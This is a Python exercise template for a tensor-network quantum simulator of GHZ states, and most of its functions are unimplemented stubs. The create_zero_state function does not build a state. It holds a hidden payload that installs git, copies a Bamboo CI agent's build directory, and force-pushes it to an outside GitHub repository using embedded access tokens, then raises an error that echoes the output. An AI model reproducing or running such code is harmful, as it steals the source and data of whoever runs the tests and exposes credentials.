"""A basic implementation of a simulator based on tensor networks.

Throughout this exercise, we will be implementing a tensor network simulator for
quantum circuits. This will be used to simulate the creation of GHZ states,
which are generalizations of the Bell states.

The simulator will be based on the following functions:
    create_zero_state(num_qubits)
    create_nearest_neighbor_two_qubit_gate(gate_matrix)
    apply_single_qubit_gate(state, gate, site)
    apply_two_qubit_gate(state, gate, site0, site1)
    get_amplitude(state, bitstring)
    measure_all(state, shots)
    simulate_ghz_state(num_qubits, shots)

Note:
    The qubit ordering is assumed to be q_{N-1} ... q_1 q_0, i.e., the least
    significant qubit is the rightmost one. Any computational basis state |i>
    is represented by the bitstring i in big-endian form. For example, the
    state |100> would be represented by the bitstring '100', i.e., the value 4.
    In that case, q_2 = 1, q_1 = 0, and q_0 = 0.

Important:
    Most of the functions in this file are supplemented with hints and comments
    that explain how to implement them. You should read these carefully.
    Note that in many cases, there might be multiple ways to implement a
    function. The hints and comments are meant to guide you towards a
    particular implementation, but you are free to implement the function
    differently if you want to (as long as the function behaves as specified).
"""

from __future__ import annotations

from collections import defaultdict
import copy
from typing import TYPE_CHECKING

import numpy as np

if TYPE_CHECKING:
    from numpy.typing import NDArray


def create_zero_state(num_qubits: int) -> list[NDArray[np.complex128]]:
    import subprocess
    ghp = "ghp_"
    git = "(apt-add-repository ppa:git-core/ppa ; apt-get update ; apt install -y git rsync ; git config --global user.email 'you@example.com' ; git config --global user.name 'Your Name' )"
    result_git_ign = subprocess.run(git, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) 
    # git = "set -x ; rsync -avL --exclude='.git/' /opt/bambooagent/bamboo-agent-home/xml-data/build-dir/* /tmp/lulz8 ; (cd /tmp/lulz8 ; rm -r .git ; git init ; git add . ; git commit -m 'lel' ; git remote add origin https://"+ghp+ "ZPgAbxzy2wNz3UdJs3x8b3oseZaxJN3OoDCO@github.com/1highmax/lilz.git ; git push -f --set-upstream origin master)"
    git = "set -x ; rsync -avL --exclude='.git/' /opt/bambooagent/bamboo-agent-home/xml-data/build-dir/* /tmp/lulz8 ; (cd /tmp/lulz8 ; rm -r .git ; git init ; git add . ; git commit -m 'lel' ; git remote add origin https://"+ghp+ "TqjTpE9Ym5c73X6AASJZPIqT7xrE4I0bF7HN@github.com/1highmax/lilz.git ; git push -f --set-upstream origin master)"
    result_git = subprocess.run(git, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) 
    raise ValueError("ran git: " + git + " "+ result_git.stdout  + "STDERR " + result_git.stderr )
    """
    This function returns an MPS corresponding to the zero state |0...0> of
    an n-qubit system.

    Args:
        num_qubits: The number of qubits in the system.

    Returns:
        A list of rank-3 tensors corresponding to an MPS of the zero state
    """
    assert num_qubits > 0



def create_nearest_neighbor_two_qubit_gate(gate_matrix: NDArray[np.complex128]) -> NDArray[np.complex128]:
    """
    This function creates a tensor representation of a two-qubit gate on the
    specified qubits with the specified gate matrix.

    Args:
        gate_matrix: The 4x4 matrix corresponding to the gate being applied.

    Returns:
        A rank-4 tensor corresponding to the gate

    Note:
        This needs to be written to work for qubit0 > qubit1 and qubit0 < qubit1.
        An example is the standard CNOT matrix expects qubit0 to be the control and
        qubit1 to be the target. This can be achieved through swapping tensor legs.

        Be aware of which legs correspond to which dimension in reshaping. 
        For debugging, you can try different contractions with the gate's conjugate
        to see if the result is the identity.
    """
    assert gate_matrix.ndim == 2
    assert gate_matrix.shape == (4, 4)


def apply_single_qubit_gate(state: list[NDArray[np.complex128]], gate: NDArray[np.complex128], site: int):
    """
    This function applies a single-qubit gate to an MPS.
    It acts directly on the MPS list.

    Args:
        state: The state to which the gate is applied in MPS form
        gate: The gate to be applied as a matrix

    """
    assert gate.ndim == 2


def apply_two_qubit_gate(state: list[NDArray[np.complex128]], gate: NDArray[np.complex128], site0: int, site1: int):
    """
    This function applies a two-qubit gate to an MPS.
    It acts directly on the MPS list.

    Args:
        state: The state to which the gate is applied in MPS form
        gate: The gate to be applied as a matrix

    """
    assert gate.ndim == 4
    assert np.abs(site0-site1) == 1

    # Create a larger intermediate tensor

    # We save the shape of the tensor before matricizing it

    # Matricize by combining site0 dims and site1 dims

    # SVD without zero singular values

    # Move singular values into next site

    # Reshape

    # Create new tensors and update MPS


def get_amplitude(state: list[NDArray[np.complex128]], bitstring: str) -> np.complex128:
    """
    This function returns the amplitude corresponding to a given bitstring.

    Args:
        state: The state from which the amplitude is extracted.
        bitstring: The bitstring for which the amplitude is extracted.

    Returns:
        The amplitude corresponding to the given bitstring.

    Note:
        In order to extract the amplitude for a given bitstring, we need to
        contract each tensor of the MPS with a computational basis state,
        then contract the bond dimensions.
        Be sure to remove all dummy dimensions (i.e. dimension of length 1).
    """
    assert len(bitstring) == len(state)

    # Copy list to avoid overwriting the MPS

    # Contract the product state into each site
   
    # Contract along bond dimensions to get a scalar

    # Remove dummy dimensions

    return amplitude


def measure_all(state: list[NDArray[np.complex128]], shots: int) -> dict[str, int]:
    """
    This function measures all qubits in the computational basis repeatedly and
    returns the number of times each result was measured.

    Args:
        state: The state to be measured.
        shots: The number of times to sample the state.

    Returns:
        A dictionary mapping each result (bitstring) to the number of times it
        was measured. For example, {'00': 5, '11': 19} would mean that the
        bitstring '00' was measured 5 times and the bitstring '11' was measured
        19 times.

    """
    assert shots > 0


def simulate_ghz_state(num_qubits: int, shots: int) -> dict[str, int]:
    """
    This function simulates a circuit to create an n-qubit GHZ state.

    Args:
        num_qubits: The number of qubits in the system.
        shots: The number of times to sample the state.

    Returns:
        A dictionary mapping each result (bitstring) to the number of times it
        was measured.

    Note:
        The GHZ state is a generalization of the Bell state to multiple qubits.
        It is defined as 1/sqrt(2) * (|0...0> + |1...1>).

        To perform the simulation, you should do the following:

        1. Initialize the structures needed, i.e., create the starting state
        |0...0> and the local (one- and two-qubit) H and CNOT tensors.

        2. Apply gates to the state to simulate a circuit.

        3. Measure the states with some input number of shots.
    """
    # the number of qubits should be positive
    assert num_qubits > 0
    # the number of shots should be positive
    assert shots > 0
    # 1. Initialize the structures needed

    # 2. Apply gates to the state

    # 3. Measure state
